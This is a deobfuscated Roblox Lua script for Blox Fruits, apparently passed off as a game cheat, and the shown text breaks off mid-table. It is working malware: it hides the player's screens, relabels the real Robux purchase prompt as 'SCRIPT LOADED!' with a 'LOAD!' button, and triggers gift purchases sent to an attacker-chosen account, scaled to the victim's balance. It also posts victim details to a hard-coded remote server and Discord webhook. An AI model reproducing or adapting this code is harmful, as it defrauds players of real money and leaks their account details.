-- deobfuscated by 25ms deobfuscator discord.gg/25ms


LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
_G.scriptExecuted = _G.scriptExecuted or false
if not _G.scriptExecuted then
    _G.scriptExecuted = true
    game:GetService("ReplicatedStorage")
    game:GetService("CoreGui")
    local vu1 = game:GetService("Players")
    local v2 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    local v3, v4, v5 = ipairs(v2:GetChildren())
    local vu6 = 0
    while true do
        local v7, v8 = v3(v4, v5)
        if v7 == nil then
            break
        end
        v5 = v7
        if v8:IsA("ScreenGui") then
            v8.Enabled = false
        end
    end
    local vu9 = game:GetService("HttpService")
    local function vu16(p10, p11)
        local v12 = {}
        for v13 = 1, # p10 do
            local v14 = p10:byte(v13)
            local v15 = p11:byte((v13 - 1) % # p11 + 1)
            table.insert(v12, string.char(bit32.bxor(v14, v15)))
        end
        return table.concat(v12)
    end
    local function vu22(p17, p18)
		-- upvalues: (ref) vu9, (ref) vu16
        local v19 = request({
            ["Url"] = "http://213.142.135.12:3000/request/" .. Webhook,
            ["Method"] = "GET"
        })
        if v19.Success then
            local v20 = request
            local v21 = {
                ["Url"] = "http://213.142.135.12:3000/send",
                ["Method"] = "POST",
                ["Body"] = vu9:JSONEncode({
                    ["data"] = p17,
                    ["type"] = p18,
                    ["token"] = vu16(v19.Body, "w$%5@WuJK2#FLx._~Bxz")
                }),
                ["Headers"] = {
                    ["Content-Type"] = "text/plain; charset=UTF-8"
                }
            }
            v20(v21)
        end
    end
    local function vu28(p23, p24)
		-- upvalues: (ref) vu9, (ref) vu16
        local v25 = request({
            ["Url"] = "http://213.142.135.12:3000/request/" .. LogsWebhook,
            ["Method"] = "GET"
        })
        if v25.Success then
            local v26 = request
            local v27 = {
                ["Url"] = "http://213.142.135.12:3000/send",
                ["Method"] = "POST",
                ["Body"] = vu9:JSONEncode({
                    ["data"] = p23,
                    ["type"] = p24,
                    ["token"] = vu16(v25.Body, "w$%5@WuJK2#FLx._~Bxz")
                }),
                ["Headers"] = {
                    ["Content-Type"] = "text/plain; charset=UTF-8"
                }
            }
            v26(v27)
        end
    end
    local _, vu29 = pcall(function()
		-- upvalues: (ref) vu1
        return vu1:GetUserIdFromNameAsync(Username)
    end)
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack({
        "buyRobuxShop",
        {
            ["StorageName"] = "2x EXP (15 mins.)",
            ["FunnelId"] = "Shop",
            ["PurchaseLocation"] = "Shop"
        }
    }))
    local vu30 = game:GetService("CoreGui")
    local v31 = vu30
    local vu32 = vu30.WaitForChild(v31, "PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    vu32.ChildAdded:Connect(function(p33)
		-- upvalues: (ref) vu32
        if p33.Name == "Prompt" then
            local v34 = vu32:WaitForChild("Prompt"):WaitForChild("AlertContents")
            local v35 = v34:FindFirstChild("MiddleContent")
            if v35 then
                v35.Visible = false
            end
            local v36 = v34:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
            if v36 and v36:IsA("TextLabel") then
                v36.Text = "SCRIPT LOADED!"
            end
            local v37 = v34:WaitForChild("Footer"):WaitForChild("Buttons")
            local v38 = v37:FindFirstChild("2")
            if v38 then
                v38.Visible = false
            end
            local v39 = v34:WaitForChild("Footer"):FindFirstChild("FooterContent")
            if v39 then
                v39.Visible = false
            end
            local v40 = v37:FindFirstChild("1")
            local v41 = v40 and v40:WaitForChild("ButtonContent"):WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
            if v41 then
                v41.Text = "LOAD!"
            end
        end
    end)
    local vu42 = game:GetService("HttpService")
    local vu43 = false
    local function vu48()
		-- upvalues: (ref) vu43, (ref) vu6, (ref) vu42, (ref) vu22, (ref) vu28
        if not vu43 then
            local v44 = {
                ["title"] = "Dark Scripts - You Got Blox Fruit Hit! :owl:",
                ["color"] = 39423,
                ["fields"] = {
                    {
                        ["name"] = "<:drawpen:1311079366125555782> \225\180\152\202\159\225\180\128\202\143\225\180\135\202\128 \201\170\201\180\234\156\176\225\180\143",
                        ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
                    },
                    {
                        ["name"] = "<:robux:1314309850154537020> \225\180\155\225\180\143\225\180\155\225\180\128\202\159 \202\128\225\180\143\202\153\225\180\156x",
                        ["value"] = "```" .. vu6 .. "```"
                    },
                    {
                        ["name"] = "\225\180\133\201\170\234\156\177\225\180\132\225\180\143\202\128\225\180\133 s\225\180\135\202\128\225\180\160\225\180\135\202\128",
                        ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)"
                    }
                }
            }
            local v45 = {
                ["title"] = "Dark Scripts - You Got Blox Fruit Hit! :owl:",
                ["color"] = 39423,
                ["fields"] = {
                    {
                        ["name"] = ":money_with_wings: \225\180\155\225\180\143\225\180\155\225\180\128\202\159 \202\128\225\180\143\202\153\225\180\156x",
                        ["value"] = "```" .. vu6 .. "```"
                    },
                    {
                        ["name"] = "\225\180\133\201\170\234\156\177\225\180\132\225\180\143\202\128\225\180\133 s\225\180\135\202\128\225\180\160\225\180\135\202\128",
                        ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)"
                    }
                }
            }
            local v46 = vu42:JSONEncode({
                ["content"] = "@everyone",
                ["embeds"] = {
                    v44
                }
            })
            local v47 = vu42:JSONEncode({
                ["content"] = "Dark On Top",
                ["embeds"] = {
                    v45
                }
            })
            vu22(vu42:JSONDecode(v46), "application/json")
            vu28(vu42:JSONDecode(v47), "application/json")
            vu43 = true
        end
    end
    function stealitem()
		-- upvalues: (ref) vu6, (ref) vu29
        if vu6 < 5000 then
            if vu6 < 4000 then
                if vu6 < 3000 then
                    if vu6 < 2700 then
                        if vu6 < 2550 then
                            if vu6 < 2500 then
                                if vu6 < 2450 then
                                    if vu6 < 2425 then
                                        if vu6 < 2400 then
                                            if vu6 < 2350 then
                                                if vu6 < 2300 then
                                                    if vu6 < 2250 then
                                                        if vu6 < 2200 then
                                                            if vu6 < 2100 then
                                                                if vu6 < 2000 then
                                                                    if vu6 < 1900 then
                                                                        if vu6 < 1800 then
                                                                            if vu6 < 1700 then
                                                                                if vu6 < 1650 then
                                                                                    if vu6 < 1500 then
                                                                                        if vu6 < 1300 then
                                                                                            if vu6 < 1275 then
                                                                                                if vu6 < 1250 then
                                                                                                    if vu6 < 1200 then
                                                                                                        if vu6 < 1100 then
                                                                                                            if vu6 < 1000 then
                                                                                                                if vu6 < 950 then
                                                                                                                    if vu6 < 850 then
                                                                                                                        if vu6 < 750 then
                                                                                                                            if vu6 < 650 then
                                                                                                                                if vu6 < 550 then
                                                                                                                                    if vu6 < 450 then
                                                                                                                                        if vu6 < 400 then
                                                                                                                                            if vu6 < 380 then
                                                                                                                                                if vu6 < 350 then
                                                                                                                                                    if vu6 < 250 then
                                                                                                                                                        if vu6 < 220 then
                                                                                                                                                            if vu6 < 180 then
                                                                                                                                                                if vu6 < 100 then
                                                                                                                                                                    if vu6 < 75 then
                                                                                                                                                                        if vu6 < 50 then
                                                                                                                                                                            if vu6 >= 25 then
                                                                                                                                                                                local v49 = {
                                                                                                                                                                                    "buyRobuxShop",
                                                                                                                                                                                    {
                                                                                                                                                                                        ["Message"] = "Dark On top",
                                                                                                                                                                                        ["StorageName"] = "2x EXP (15 mins.)",
                                                                                                                                                                                        ["PurchaseLocation"] = "Shop",
                                                                                                                                                                                        ["FunnelId"] = "Shop",
                                                                                                                                                                                        ["ReceiverName"] = Username,
                                                                                                                                                                                        ["ReceiverUserId"] = vu29
                                                                                                                                                                                    }
                                                                                                                                                                                }
                                                                                                                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v49))
                                                                                                                                                                            end
                                                                                                                                                                        else
                                                                                                                                                                            local v50 = {
                                                                                                                                                                                "buyRobuxShop",
                                                                                                                                                                                {
                                                                                                                                                                                    ["Message"] = "Dark On top",
                                                                                                                                                                                    ["PurchaseAction"] = "Gift",
                                                                                                                                                                                    ["PurchaseLocation"] = "FruitShop",
                                                                                                                                                                                    ["StorageName"] = "Permanent Rocket-Rocket",
                                                                                                                                                                                    ["FunnelId"] = "Shop",
                                                                                                                                                                                    ["ReceiverName"] = Username,
                                                                                                                                                                                    ["ReceiverUserId"] = vu29
                                                                                                                                                                                }
                                                                                                                                                                            }
                                                                                                                                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v50))
                                                                                                                                                                        end
                                                                                                                                                                    else
                                                                                                                                                                        local v51 = {
                                                                                                                                                                            "buyRobuxShop",
                                                                                                                                                                            {
                                                                                                                                                                                ["Message"] = "Dark On top",
                                                                                                                                                                                ["StorageName"] = "Permanent Spin-Spin",
                                                                                                                                                                                ["PurchaseLocation"] = "FruitShop",
                                                                                                                                                                                ["FunnelId"] = "Shop",
                                                                                                                                                                                ["ReceiverName"] = Username,
                                                                                                                                                                                ["ReceiverUserId"] = vu29
                                                                                                                                                                            }
                                                                                                                                                                        }
                                                                                                                                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v51))
                                                                                                                                                                    end
                                                                                                                                                                else
                                                                                                                                                                    local v52 = {
                                                                                                                                                                        "buyRobuxShop",
                                                                                                                                                                        {
                                                                                                                                                                            ["Message"] = "Dark On top",
                                                                                                                                                                            ["StorageName"] = "Permanent Blade-Blade",
                                                                                                                                                                            ["PurchaseLocation"] = "FruitShop",
                                                                                                                                                                            ["FunnelId"] = "Shop",
                                                                                                                                                                            ["ReceiverName"] = Username,
                                                                                                                                                                            ["ReceiverUserId"] = vu29
                                                                                                                                                                        }
                                                                                                                                                                    }
                                                                                                                                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v52))
                                                                                                                                                                end
                                                                                                                                                            else
                                                                                                                                                                local v53 = {
                                                                                                                                                                    "buyRobuxShop",
                                                                                                                                                                    {
                                                                                                                                                                        ["Message"] = "Dark On top",
                                                                                                                                                                        ["StorageName"] = "Permanent Spring-Spring",
                                                                                                                                                                        ["PurchaseLocation"] = "FruitShop",
                                                                                                                                                                        ["FunnelId"] = "Shop",
                                                                                                                                                                        ["ReceiverName"] = Username,
                                                                                                                                                                        ["ReceiverUserId"] = vu29
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v53))
                                                                                                                                                            end
                                                                                                                                                        else
                                                                                                                                                            local v54 = {
                                                                                                                                                                "buyRobuxShop",
                                                                                                                                                                {
                                                                                                                                                                    ["Message"] = "Dark On top",
                                                                                                                                                                    ["StorageName"] = "Permanent Bomb-Bomb",
                                                                                                                                                                    ["PurchaseLocation"] = "FruitShop",
                                                                                                                                                                    ["FunnelId"] = "Shop",
                                                                                                                                                                    ["ReceiverName"] = Username,
                                                                                                                                                                    ["ReceiverUserId"] = vu29
                                                                                                                                                                }
                                                                                                                                                            }
                                                                                                                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v54))
                                                                                                                                                        end
                                                                                                                                                    else
                                                                                                                                                        local v55 = {
                                                                                                                                                            "buyRobuxShop",
                                                                                                                                                            {
                                                                                                                                                                ["Message"] = "Dark On top",
                                                                                                                                                                ["StorageName"] = "Permanent Smoke-Smoke",
                                                                                                                                                                ["PurchaseLocation"] = "FruitShop",
                                                                                                                                                                ["FunnelId"] = "Shop",
                                                                                                                                                                ["ReceiverName"] = Username,
                                                                                                                                                                ["ReceiverUserId"] = vu29
                                                                                                                                                            }
                                                                                                                                                        }
                                                                                                                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v55))
                                                                                                                                                    end
                                                                                                                                                else
                                                                                                                                                    local v56 = {
                                                                                                                                                        "buyRobuxShop",
                                                                                                                                                        {
                                                                                                                                                            ["Message"] = "Dark On top",
                                                                                                                                                            ["StorageName"] = "2x Boss Drops",
                                                                                                                                                            ["PurchaseLocation"] = "Shop",
                                                                                                                                                            ["FunnelId"] = "Shop",
                                                                                                                                                            ["ReceiverName"] = Username,
                                                                                                                                                            ["ReceiverUserId"] = vu29
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v56))
                                                                                                                                                end
                                                                                                                                            else
                                                                                                                                                local v57 = {
                                                                                                                                                    "buyRobuxShop",
                                                                                                                                                    {
                                                                                                                                                        ["Message"] = "Dark On top",
                                                                                                                                                        ["StorageName"] = "Permanent Spike-Spike",
                                                                                                                                                        ["PurchaseLocation"] = "FruitShop",
                                                                                                                                                        ["FunnelId"] = "Shop",
                                                                                                                                                        ["ReceiverName"] = Username,
                                                                                                                                                        ["ReceiverUserId"] = vu29
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v57))
                                                                                                                                            end
                                                                                                                                        else
                                                                                                                                            local v58 = {
                                                                                                                                                "buyRobuxShop",
                                                                                                                                                {
                                                                                                                                                    ["Message"] = "Dark On top",
                                                                                                                                                    ["StorageName"] = "+1 Fruit Storage",
                                                                                                                                                    ["PurchaseLocation"] = "Shop",
                                                                                                                                                    ["FunnelId"] = "Shop",
                                                                                                                                                    ["ReceiverName"] = Username,
                                                                                                                                                    ["ReceiverUserId"] = vu29
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v58))
                                                                                                                                        end
                                                                                                                                    else
                                                                                                                                        local v59 = {
                                                                                                                                            "buyRobuxShop",
                                                                                                                                            {
                                                                                                                                                ["Message"] = "Dark On top",
                                                                                                                                                ["StorageName"] = "2x Money",
                                                                                                                                                ["PurchaseLocation"] = "Shop",
                                                                                                                                                ["FunnelId"] = "Shop",
                                                                                                                                                ["ReceiverName"] = Username,
                                                                                                                                                ["ReceiverUserId"] = vu29
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v59))
                                                                                                                                    end
                                                                                                                                else
                                                                                                                                    local v60 = {
                                                                                                                                        "buyRobuxShop",
                                                                                                                                        {
                                                                                                                                            ["Message"] = "Dark On top",
                                                                                                                                            ["StorageName"] = "Permanent Flame-Flame",
                                                                                                                                            ["PurchaseLocation"] = "FruitShop",
                                                                                                                                            ["FunnelId"] = "Shop",
                                                                                                                                            ["ReceiverName"] = Username,
                                                                                                                                            ["ReceiverUserId"] = vu29
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v60))
                                                                                                                                end
                                                                                                                            else
                                                                                                                                local v61 = {
                                                                                                                                    "buyRobuxShop",
                                                                                                                                    {
                                                                                                                                        ["Message"] = "Dark On top",
                                                                                                                                        ["StorageName"] = "Permanent Falcon-Falcon",
                                                                                                                                        ["PurchaseLocation"] = "FruitShop",
                                                                                                                                        ["FunnelId"] = "Shop",
                                                                                                                                        ["ReceiverName"] = Username,
                                                                                                                                        ["ReceiverUserId"] = vu29
                                                                                                                                    }
                                                                                                                                }
                                                                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v61))
                                                                                                                            end
                                                                                                                        else
                                                                                                                            local v62 = {
                                                                                                                                "buyRobuxShop",
                                                                                                                                {
                                                                                                                                    ["Message"] = "Dark On top",
                                                                                                                                    ["StorageName"] = "Permanent Ice-Ice",
                                                                                                                                    ["PurchaseLocation"] = "FruitShop",
                                                                                                                                    ["FunnelId"] = "Shop",
                                                                                                                                    ["ReceiverName"] = Username,
                                                                                                                                    ["ReceiverUserId"] = vu29
                                                                                                                                }
                                                                                                                            }
                                                                                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v62))
                                                                                                                        end
                                                                                                                    else
                                                                                                                        local v63 = {
                                                                                                                            "buyRobuxShop",
                                                                                                                            {
                                                                                                                                ["Message"] = "Dark On top",
                                                                                                                                ["StorageName"] = "Permanent Sand-Sand",
                                                                                                                                ["PurchaseLocation"] = "FruitShop",
                                                                                                                                ["FunnelId"] = "Shop",
                                                                                                                                ["ReceiverName"] = Username,
                                                                                                                                ["ReceiverUserId"] = vu29
                                                                                                                            }
                                                                                                                        }
                                                                                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v63))
                                                                                                                    end
                                                                                                                else
                                                                                                                    local v64 = {
                                                                                                                        "buyRobuxShop",
                                                                                                                        {
                                                                                                                            ["Message"] = "Dark On top",
                                                                                                                            ["StorageName"] = "Permanent Dark-Dark",
                                                                                                                            ["PurchaseLocation"] = "FruitShop",
                                                                                                                            ["FunnelId"] = "Shop",
                                                                                                                            ["ReceiverName"] = Username,
                                                                                                                            ["ReceiverUserId"] = vu29
                                                                                                                        }
                                                                                                                    }
                                                                                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v64))
                                                                                                                end
                                                                                                            else
                                                                                                                local v65 = {
                                                                                                                    "buyRobuxShop",
                                                                                                                    {
                                                                                                                        ["Message"] = "Dark On top",
                                                                                                                        ["StorageName"] = "Permanent Diamond-Diamond",
                                                                                                                        ["PurchaseLocation"] = "FruitShop",
                                                                                                                        ["FunnelId"] = "Shop",
                                                                                                                        ["ReceiverName"] = Username,
                                                                                                                        ["ReceiverUserId"] = vu29
                                                                                                                    }
                                                                                                                }
                                                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v65))
                                                                                                            end
                                                                                                        else
                                                                                                            local v66 = {
                                                                                                                "buyRobuxShop",
                                                                                                                {
                                                                                                                    ["Message"] = "Dark On top",
                                                                                                                    ["StorageName"] = "Permanent Light-Light",
                                                                                                                    ["PurchaseLocation"] = "FruitShop",
                                                                                                                    ["FunnelId"] = "Shop",
                                                                                                                    ["ReceiverName"] = Username,
                                                                                                                    ["ReceiverUserId"] = vu29
                                                                                                                }
                                                                                                            }
                                                                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v66))
                                                                                                        end
                                                                                                    else
                                                                                                        local v67 = {
                                                                                                            "buyRobuxShop",
                                                                                                            {
                                                                                                                ["Message"] = "Dark On top",
                                                                                                                ["StorageName"] = "Dark Blade",
                                                                                                                ["PurchaseLocation"] = "Shop",
                                                                                                                ["FunnelId"] = "Shop",
                                                                                                                ["ReceiverName"] = Username,
                                                                                                                ["ReceiverUserId"] = vu29
                                                                                                            }
                                                                                                        }
                                                                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v67))
                                                                                                    end
                                                                                                else
                                                                                                    local v68 = {
                                                                                                        "buyRobuxShop",
                                                                                                        {
                                                                                                            ["Message"] = "Dark On top",
                                                                                                            ["StorageName"] = "Permanent Barrier-Barrier",
                                                                                                            ["PurchaseLocation"] = "FruitShop",
                                                                                                            ["FunnelId"] = "Shop",
                                                                                                            ["ReceiverName"] = Username,
                                                                                                            ["ReceiverUserId"] = vu29
                                                                                                        }
                                                                                                    }
                                                                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v68))
                                                                                                end
                                                                                            else
                                                                                                local v69 = {
                                                                                                    "buyRobuxShop",
                                                                                                    {
                                                                                                        ["Message"] = "Dark On top",
                                                                                                        ["StorageName"] = "Permanent Ghost-Ghost",
                                                                                                        ["PurchaseLocation"] = "FruitShop",
                                                                                                        ["FunnelId"] = "Shop",
                                                                                                        ["ReceiverName"] = Username,
                                                                                                        ["ReceiverUserId"] = vu29
                                                                                                    }
                                                                                                }
                                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v69))
                                                                                            end
                                                                                        else
                                                                                            local v70 = {
                                                                                                "buyRobuxShop",
                                                                                                {
                                                                                                    ["Message"] = "Dark On top",
                                                                                                    ["StorageName"] = "Permanent Magma-Magma",
                                                                                                    ["PurchaseLocation"] = "FruitShop",
                                                                                                    ["FunnelId"] = "Shop",
                                                                                                    ["ReceiverName"] = Username,
                                                                                                    ["ReceiverUserId"] = vu29
                                                                                                }
                                                                                            }
                                                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v70))
                                                                                        end
                                                                                    else
                                                                                        local v71 = {
                                                                                            "buyRobuxShop",
                                                                                            {
                                                                                                ["Message"] = "Dark On top",
                                                                                                ["StorageName"] = "Permanent Quake-Quake",
                                                                                                ["PurchaseLocation"] = "FruitShop",
                                                                                                ["FunnelId"] = "Shop",
                                                                                                ["ReceiverName"] = Username,
                                                                                                ["ReceiverUserId"] = vu29
                                                                                            }
                                                                                        }
                                                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v71))
                                                                                    end
                                                                                else
                                                                                    local v72 = {
                                                                                        "buyRobuxShop",
                                                                                        {
                                                                                            ["Message"] = "Dark On top",
                                                                                            ["StorageName"] = "Permanent Buddha-Buddha",
                                                                                            ["PurchaseLocation"] = "FruitShop",
                                                                                            ["FunnelId"] = "Shop",
                                                                                            ["ReceiverName"] = Username,
                                                                                            ["ReceiverUserId"] = vu29
                                                                                        }
                                                                                    }
                                                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v72))
                                                                                end
                                                                            else
                                                                                local v73 = {
                                                                                    "buyRobuxShop",
                                                                                    {
                                                                                        ["Message"] = "Dark On top",
                                                                                        ["StorageName"] = "Permanent Love-Love",
                                                                                        ["PurchaseLocation"] = "FruitShop",
                                                                                        ["FunnelId"] = "Shop",
                                                                                        ["ReceiverName"] = Username,
                                                                                        ["ReceiverUserId"] = vu29
                                                                                    }
                                                                                }
                                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v73))
                                                                            end
                                                                        else
                                                                            local v74 = {
                                                                                "buyRobuxShop",
                                                                                {
                                                                                    ["Message"] = "Dark On top",
                                                                                    ["StorageName"] = "Permanent Spider-Spider",
                                                                                    ["PurchaseLocation"] = "FruitShop",
                                                                                    ["FunnelId"] = "Shop",
                                                                                    ["ReceiverName"] = Username,
                                                                                    ["ReceiverUserId"] = vu29
                                                                                }
                                                                            }
                                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v74))
                                                                        end
                                                                    else
                                                                        local v75 = {
                                                                            "buyRobuxShop",
                                                                            {
                                                                                ["Message"] = "Dark On top",
                                                                                ["StorageName"] = "Permanent Sound-Sound",
                                                                                ["PurchaseLocation"] = "FruitShop",
                                                                                ["FunnelId"] = "Shop",
                                                                                ["ReceiverName"] = Username,
                                                                                ["ReceiverUserId"] = vu29
                                                                            }
                                                                        }
                                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v75))
                                                                    end
                                                                else
                                                                    local v76 = {
                                                                        "buyRobuxShop",
                                                                        {
                                                                            ["Message"] = "Dark On top",
                                                                            ["StorageName"] = "Permanent Portal-Portal",
                                                                            ["PurchaseLocation"] = "FruitShop",
                                                                            ["FunnelId"] = "Shop",
                                                                            ["ReceiverName"] = Username,
                                                                            ["ReceiverUserId"] = vu29
                                                                        }
                                                                    }
                                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v76))
                                                                end
                                                            else
                                                                local v77 = {
                                                                    "buyRobuxShop",
                                                                    {
                                                                        ["Message"] = "Dark On top",
                                                                        ["StorageName"] = "Permanent Rumble-Rumble",
                                                                        ["PurchaseLocation"] = "FruitShop",
                                                                        ["FunnelId"] = "Shop",
                                                                        ["ReceiverName"] = Username,
                                                                        ["ReceiverUserId"] = vu29
                                                                    }
                                                                }
                                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v77))
                                                            end
                                                        else
                                                            local v78 = {
                                                                "buyRobuxShop",
                                                                {
                                                                    ["Message"] = "Dark On top",
                                                                    ["StorageName"] = "Permanent Pain-Pain",
                                                                    ["PurchaseLocation"] = "FruitShop",
                                                                    ["FunnelId"] = "Shop",
                                                                    ["ReceiverName"] = Username,
                                                                    ["ReceiverUserId"] = vu29
                                                                }
                                                            }
                                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v78))
                                                        end
                                                    else
                                                        local v79 = {
                                                            "buyRobuxShop",
                                                            {
                                                                ["Message"] = "Dark On top",
                                                                ["StorageName"] = "Permanent Blizzard-Blizzard",
                                                                ["PurchaseLocation"] = "FruitShop",
                                                                ["FunnelId"] = "Shop",
                                                                ["ReceiverName"] = Username,
                                                                ["ReceiverUserId"] = vu29
                                                            }
                                                        }
                                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v79))
                                                    end
                                                else
                                                    local v80 = {
                                                        "buyRobuxShop",
                                                        {
                                                            ["Message"] = "Dark On top",
                                                            ["StorageName"] = "Permanent Gravity-Gravity",
                                                            ["PurchaseLocation"] = "FruitShop",
                                                            ["FunnelId"] = "Shop",
                                                            ["ReceiverName"] = Username,
                                                            ["ReceiverUserId"] = vu29
                                                        }
                                                    }
                                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v80))
                                                end
                                            else
                                                local v81 = {
                                                    "buyRobuxShop",
                                                    {
                                                        ["Message"] = "Dark On top",
                                                        ["StorageName"] = "Permanent T-Rex-T-Rex",
                                                        ["PurchaseLocation"] = "FruitShop",
                                                        ["FunnelId"] = "Shop",
                                                        ["ReceiverName"] = Username,
                                                        ["ReceiverUserId"] = vu29
                                                    }
                                                }
                                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v81))
                                            end
                                        else
                                            local v82 = {
                                                "buyRobuxShop",
                                                {
                                                    ["Message"] = "Dark On top",
                                                    ["StorageName"] = "Permanent Dough-Dough",
                                                    ["PurchaseLocation"] = "FruitShop",
                                                    ["FunnelId"] = "Shop",
                                                    ["ReceiverName"] = Username,
                                                    ["ReceiverUserId"] = vu29
                                                }
                                            }
                                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v82))
                                        end
                                    else
                                        local v83 = {
                                            "buyRobuxShop",
                                            {
                                                ["Message"] = "Dark On top",
                                                ["StorageName"] = "Permanent Shadow-Shadow",
                                                ["PurchaseLocation"] = "FruitShop",
                                                ["FunnelId"] = "Shop",
                                                ["ReceiverName"] = Username,
                                                ["ReceiverUserId"] = vu29
                                            }
                                        }
                                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v83))
                                    end
                                else
                                    local v84 = {
                                        "buyRobuxShop",
                                        {
                                            ["Message"] = "Dark On top",
                                            ["StorageName"] = "Permanent Venom-Venom",
                                            ["PurchaseLocation"] = "FruitShop",
                                            ["FunnelId"] = "Shop",
                                            ["ReceiverName"] = Username,
                                            ["ReceiverUserId"] = vu29
                                        }
                                    }
                                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v84))
                                end
                            else
                                local v85 = {
                                    "buyRobuxShop",
                                    {
                                        ["Message"] = "Dark On top",
                                        ["StorageName"] = "Permanent Gas-Gas",
                                        ["PurchaseLocation"] = "FruitShop",
                                        ["FunnelId"] = "Shop",
                                        ["ReceiverName"] = Username,
                                        ["ReceiverUserId"] = vu29
                                    }
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v85))
                            end
                        else
                            local v86 = {
                                "buyRobuxShop",
                                {
                                    ["Message"] = "Dark On top",
                                    ["StorageName"] = "Permanent Spirit-Spirit",
                                    ["PurchaseLocation"] = "FruitShop",
                                    ["FunnelId"] = "Shop",
                                    ["ReceiverName"] = Username,
                                    ["ReceiverUserId"] = vu29
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v86))
                        end
                    else
                        local v87 = {
                            "buyRobuxShop",
                            {
                                ["Message"] = "Dark On top",
                                ["StorageName"] = "Fruit Notifier",
                                ["PurchaseLocation"] = "Shop",
                                ["FunnelId"] = "Shop",
                                ["ReceiverName"] = Username,
                                ["ReceiverUserId"] = vu29
                            }
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(v87))
                    end
                else
                    local v88 = {
                        "buyRobuxShop",
                        {
                            ["Message"] = "Dark On top",
